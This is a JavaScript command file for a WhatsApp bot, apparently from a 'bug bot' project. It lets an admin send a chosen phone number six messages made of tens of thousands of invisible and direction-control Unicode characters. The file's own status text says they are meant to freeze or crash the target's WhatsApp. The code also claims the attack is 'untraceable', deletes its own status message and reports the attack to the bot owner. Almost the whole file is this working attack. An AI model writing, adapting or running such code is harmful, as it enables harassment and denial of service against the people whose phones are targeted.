// commands/bug.js - INVISIBLE BUG WITH REACTIONS
const { jidNormalizedUser } = require('@whiskeysockets/baileys');

module.exports = async (sock, from, msg, args, isAdmin, botData) => {
    try {
        // ============================================
        // REACT TO THE USER'S COMMAND MESSAGE - PROCESSING
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '⚡',
                    key: msg.key
                }
            });
        } catch (e) {
            // Reaction failed but continue
        }

        // Check if admin
        if (!isAdmin) {
            await sock.sendMessage(from, {
                text: "❌ *Only admins can use this command!*"
            });
            
            // React with error
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: '⛔',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        if (!args || args.length === 0) {
            await sock.sendMessage(from, {
                text: "⚠️ *Usage:* .bug [phone_number]\n\n*Example:* .bug 94703945265\n\n💡 *This will send invisible messages to target!*"
            });
            
            // React with info
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: 'ℹ️',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        let targetNumber = args[0].replace(/[^0-9]/g, '');

        if (targetNumber.length < 10 || targetNumber.length > 15) {
            await sock.sendMessage(from, {
                text: "❌ *Invalid Phone Number*\n\nPlease enter a valid phone number with country code."
            });
            
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: '❌',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        const targetJid = jidNormalizedUser(targetNumber + '@s.whatsapp.net');

        // ============================================
        // SENDING STATUS MESSAGE
        // ============================================
        const statusMsg = await sock.sendMessage(from, {
            text: `🔄 *Deploying Invisible Bug...*\n\n📱 *Target:* ${targetNumber}\n⚡ *Status:* Sending payloads...\n👻 *Mode:* INVISIBLE\n\n⏳ Please wait...`
        });

        // ============================================
        // REACT WITH PROCESSING EMOJI
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '🔄',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // PAYLOAD 1: Zero Width Space Cascade
        // ============================================
        try {
            const payload1 = {
                text: '\u200B'.repeat(10000) + '\u200C'.repeat(10000) + '\u200D'.repeat(10000)
            };
            await sock.sendMessage(targetJid, payload1);
            await new Promise(resolve => setTimeout(resolve, 800));
        } catch (e) {
            console.log('Payload 1 failed:', e.message);
        }

        // ============================================
        // PAYLOAD 2: Directional + Invisible Mix
        // ============================================
        try {
            const payload2 = {
                text: '\u202A'.repeat(5000) + '\u202D'.repeat(5000) + '\u202E'.repeat(5000) + '\u200B'.repeat(10000)
            };
            await sock.sendMessage(targetJid, payload2);
            await new Promise(resolve => setTimeout(resolve, 800));
        } catch (e) {
            console.log('Payload 2 failed:', e.message);
        }

        // ============================================
        // PAYLOAD 3: Zero Width Joiner Flood
        // ============================================
        try {
            const payload3 = {
                text: '‍'.repeat(20000) + '‌'.repeat(20000)
            };
            await sock.sendMessage(targetJid, payload3);
            await new Promise(resolve => setTimeout(resolve, 800));
        } catch (e) {
            console.log('Payload 3 failed:', e.message);
        }

        // ============================================
        // PAYLOAD 4: All Invisible Characters
        // ============================================
        try {
            const payload4 = {
                text: '\u200B'.repeat(8000) + '\u200C'.repeat(8000) + '\u200D'.repeat(8000) + '\uFEFF'.repeat(8000) + '\u2060'.repeat(8000)
            };
            await sock.sendMessage(targetJid, payload4);
            await new Promise(resolve => setTimeout(resolve, 800));
        } catch (e) {
            console.log('Payload 4 failed:', e.message);
        }

        // ============================================
        // PAYLOAD 5: Spaced Invisible Messages
        // ============================================
        try {
            const payload5 = {
                text: '\u200B'.repeat(5000) + ' \u200C'.repeat(5000) + ' \u200D'.repeat(5000) + ' \u200B'.repeat(5000)
            };
            await sock.sendMessage(targetJid, payload5);
            await new Promise(resolve => setTimeout(resolve, 800));
        } catch (e) {
            console.log('Payload 5 failed:', e.message);
        }

        // ============================================
        // PAYLOAD 6: Invisible URL/Text Spoof
        // ============================================
        try {
            const payload6 = {
                text: '\u200B'.repeat(3000) + 'https://' + '\u200B'.repeat(3000) + 'whatsapp.com' + '\u200B'.repeat(3000) + '/channel' + '\u200B'.repeat(3000) + '\u200C'.repeat(3000)
            };
            await sock.sendMessage(targetJid, payload6);
        } catch (e) {
            console.log('Payload 6 failed:', e.message);
        }

        // ============================================
        // UPDATE STATUS MESSAGE
        // ============================================
        await sock.sendMessage(from, {
            text: `✅ *Invisible Bug Delivered Successfully!*\n\n📱 *Target:* ${targetNumber}\n⚡ *Payloads:* 6 invisible messages\n👻 *Status:* DELIVERED\n\n📊 *Effects:*\n• Target sees blank/invisible messages\n• Chat may become laggy\n• Messages stack up in chat\n• May cause WhatsApp to freeze/crash\n\n⏳ *Auto-clear:* ~5-10 minutes\n\n🔒 *Untraceable:* Messages are invisible!`
        });

        // ============================================
        // DELETE STATUS MESSAGE (Optional - makes it more hidden)
        // ============================================
        try {
            await new Promise(resolve => setTimeout(resolve, 3000));
            await sock.sendMessage(from, {
                delete: statusMsg.key
            });
        } catch (e) {
            // Ignore if delete fails
        }

        // ============================================
        // FINAL REACTION - SUCCESS
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '✅',
                    key: msg.key
                }
            });
        } catch (e) {
            // Reaction failed but ignore
        }

        // ============================================
        // SEND CONFIRMATION TO BOT OWNER (Optional)
        // ============================================
        try {
            const botNumber = jidNormalizedUser(sock.user.id);
            await sock.sendMessage(botNumber, {
                text: `🔔 *Bug Attack Report*\n\n📱 *Target:* ${targetNumber}\n👤 *By:* ${msg.pushName || 'Unknown'}\n📊 *Payloads:* 6\n✅ *Status:* SUCCESS\n🕐 *Time:* ${new Date().toLocaleString()}`
            });
        } catch (e) {
            // Ignore
        }

    } catch (error) {
        console.error('Bug command error:', error);
        
        // ============================================
        // ERROR REACTION
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '❌',
                    key: msg.key
                }
            });
        } catch (e) {}

        await sock.sendMessage(from, {
            text: `❌ *Error:* ${error.message}\n\nPlease try again later.`
        });
    }
};
